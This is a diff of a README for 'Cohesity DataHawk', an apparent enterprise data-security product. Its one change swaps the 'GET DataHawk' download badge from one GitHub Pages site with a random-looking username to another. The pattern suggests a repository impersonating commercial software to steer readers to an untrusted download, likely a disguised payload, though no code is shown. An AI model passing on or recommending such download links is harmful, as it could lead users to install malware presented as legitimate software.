@@ -1,6 +1,6 @@
 # Cohesity DataHawk - Enterprise Data Security Platform
 
-[![GET DataHawk](https://img.shields.io/badge/GET%20%E2%80%94%20DataHawk-0078D6?style=for-the-badge&logoColor=white)](https://brysoncollinscdub.github.io/.github/datahawk)
+[![GET DataHawk](https://img.shields.io/badge/GET%20%E2%80%94%20DataHawk-0078D6?style=for-the-badge&logoColor=white)](https://denverfriedmanhdwd.github.io/.github/Cohesity-dataHawk)
 
 ## What DataHawk Helps Teams Understand
 
